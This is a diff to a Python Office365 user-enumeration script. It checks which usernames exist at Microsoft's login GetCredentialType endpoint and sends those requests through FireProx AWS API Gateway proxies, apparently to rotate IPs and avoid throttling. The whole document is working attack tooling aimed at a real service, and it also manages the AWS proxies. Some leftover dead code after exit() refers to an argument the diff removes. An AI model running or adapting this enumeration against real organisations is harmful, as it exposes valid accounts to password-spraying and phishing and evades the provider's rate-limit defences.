@@ -13,36 +13,42 @@ import argparse
 import logging
 import requests
 import xml.etree.ElementTree as ET 
+from queue import Queue
+import threading
+import datetime
+import time
+import sys
+from bs4 import BeautifulSoup
+import fire
+import boto3, botocore
+
+mutex = threading.Lock()
+count_queue = Queue()
+search_results = set()
+
 
 try:
     import http.client as http_client
 except ImportError:
     import httplib as http_client
 
-def load_usernames(usernames_file):
-    '''
-    Loads a list of usernames from `usernames_file`.
 
-    Args:
-        usernames_file(str): filename of file holding usernames
-
-    Returns:
-        usernames(list): a list of usernames
-    '''
+def load_usernames(usernames_file: str, domain: str = False) -> list:
+    ''' Load usernames from provided file; returns usernames as list<str>'''
+    user_list = []
     with open(usernames_file) as file_handle:
-        return [line.strip() for line in file_handle.readlines()]
+        for line in file_handle:
+            user = line.strip()
+            if domain:
+                user = f'{user}@{domain}'
+            user_list.append(user)
+    return user_list
 
-def o365enum_office(usernames):
-    '''
-    Checks if `usernames` exists using office.com method.
 
-    Args:
-        usernames(list): list of usernames to enumerate
-    '''
-    headers = {
-        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"\
-            " (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
-    }
+def o365enum_office(usernames: list, fireprox_url: str) -> None:
+    '''Check a list of usernames for validity via office.com method'''
+    headers = { "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" }
+    
     # first we open office.com main page
     session = requests.session()
     response = session.get(
@@ -110,11 +116,8 @@ def o365enum_office(usernames):
             domain = " "
         if not domain in environments or environments[domain] == "MANAGED":
             payload["username"] = username
-            response = session.post(
-                "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US",
-                headers=headers,
-                json=payload
-            )
+            response = session.post(fireprox_url, headers=headers, json=payload)
+            print(response.content)
             if response.status_code == 200:
                 throttleStatus = int(response.json()['ThrottleStatus'])
                 ifExistsResult = str(response.json()['IfExistsResult'])
@@ -132,25 +135,94 @@ def o365enum_office(usernames):
         else:
             print("{} DOMAIN TYPE {} NOT SUPPORTED".format(username, environments[domain]))
 
+
+def prep_proxy(args: argparse.Namespace, url: str) -> fire.FireProx:
+    """Prepares Fireprox proxy object based off supplied / located AWS keys"""
+    ns = argparse.Namespace()
+    ns.profile_name = args.profile # ('--profile_name',default=args.profile)
+    ns.access_key = args.access_key    # parser.add_argument('--access_key',default=args.access_key)
+    ns.secret_access_key = args.secret_key    # parser.add_argument('--secret_access_key',default=args.secret_key)
+    ns.session_token = args.session_token # parser.add_argument('--session_token',default=args.session_token)
+    ns.region = args.region    # parser.add_argument('--region',default=args.region)
+    ns.command = 'create'    # parser.add_argument('--command',default='create')
+    ns.api_id = None    # parser.add_argument('--api_id',default=None)
+    ns.url = url    # parser.add_argument('--url', default=url)
+    return fire.FireProx(ns, 'This is a useless help message :(')
+
+
+def list_fireprox_apis(fp: fire.FireProx) -> list:
+    """Lists active Fireprox APIs within the account; returns API Ids of said proxies"""
+    res = fp.list_api()
+    return [entry.get('id', '') for entry in res]
+
+
+def delete_fireprox_apis(fp: fire.FireProx) -> list:
+    """Removes all Fireprox APIs within an AWS account"""
+    print('[+] Listing Fireprox APIs prior to deletion')
+    ids = list_fireprox_apis(fp)
+    for prox in ids:
+        print(f'[+] Attempting to delete API \'{prox}\'')
+        fp.delete_api(prox)
+    print('[+] Fireprox APIs following deletion:')
+    return list_fireprox_apis(fp) # Should be empty list []
+    
+
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
-        description='Office365 User Enumeration Script')
-    parser.add_argument('-u', '--userlist', required=True, type=str,\
-        help='username list one per line')
-    parser.add_argument('-v', '--verbose', default=False, action='store_true',\
-        help='Enable verbose output at urllib level')
+    parser = argparse.ArgumentParser(description='Office365 User Enumeration Script')
+    parser.add_argument('command',help='Module / command to run [list,delete,enum]')
+    parser.add_argument('-u', '--users',default=False,required=False,help="Required for 'enum' module; File containing list of users / emails to enumerate")
+    parser.add_argument('-d', '--domain',default=False,required=False,help="Email domain if not already included within user file")
+    parser.add_argument('-v', '--verbose', default=False, action='store_true',help='Enable verbose output at urllib level')
+    parser.add_argument('--profile',default='default',help='AWS profile within ~/.aws/credentials to use [default: default]')
+    parser.add_argument('--access-key', default=None,required=False,help='AWS access key id for fireprox API creation')
+    parser.add_argument('--secret-key',default=None,required=False,help='AWS secret access key for fireprox API creation')
+    parser.add_argument('--session-token',default=None,required=False,help='AWS session token for assumed / temporary roles')
+    parser.add_argument('--region',default='us-east-1',required=False,help='AWS region to which fireprox API will be deployed [default: us-east-1]')
     args = parser.parse_args()
 
+    # Verbosity settings
     if args.verbose:
         http_client.HTTPConnection.debuglevel = 1
-        logging.basicConfig(
-            format="%(asctime)s: %(levelname)s: %(module)s: %(message)s"
-        )
+        logging.basicConfig(format="%(asctime)s: %(levelname)s: %(module)s: %(message)s")
         logging.getLogger().setLevel(logging.DEBUG)
         requests_log = logging.getLogger("requests.packages.urllib3")
         requests_log.setLevel(logging.DEBUG)
         requests_log.propagate = True
 
+    # Fetch AWS access key info
+    try:
+        if (any([args.access_key, args.secret_key, args.session_token])):
+            aws_session = boto3.Session(args.access_key, args.secret_key, args.session_token)
+        else:
+            aws_session = boto3.Session(profile_name=args.profile)
+        args.access_key = aws_session.get_credentials().access_key
+        args.secret_key = aws_session.get_credentials().secret_key
+        args.session_token = aws_session.get_credentials().token
+    except botocore.exceptions.ProfileNotFound as err:
+        print(f'[x] {err}. Specify credentials here or include them as command arguments')
+        args.access_key = input('\tAWS Access Key Id: ')
+        args.secret_key = input('\tAWS Secret Access Key: ')
+
+    fp = prep_proxy(args, 'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US')
+    
+    # Run 'module'
+    if (args.command == 'list'):
+        list_fireprox_apis(fp)
+    elif (args.command == 'delete'):
+        delete_fireprox_apis(fp)
+    elif (args.command == 'enum'):
+        fireprox_url = fp.create_api('https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US')
+        users = load_usernames(args.users, args.domain)
+        #try:
+        o365enum_office(users, fireprox_url)
+        #except Exception as err:
+        #    print(f'[x] {err}; Deleting Fireprox APIs')
+        #    delete_fireprox_apis(fp)
+    else:
+        print(f'[x] Invalid option \'{args.command}\' is not in [list,delete,enum]')
+        parser.print_help()
+    exit()
+
     o365enum_office(load_usernames(args.userlist))
 
+    exit()
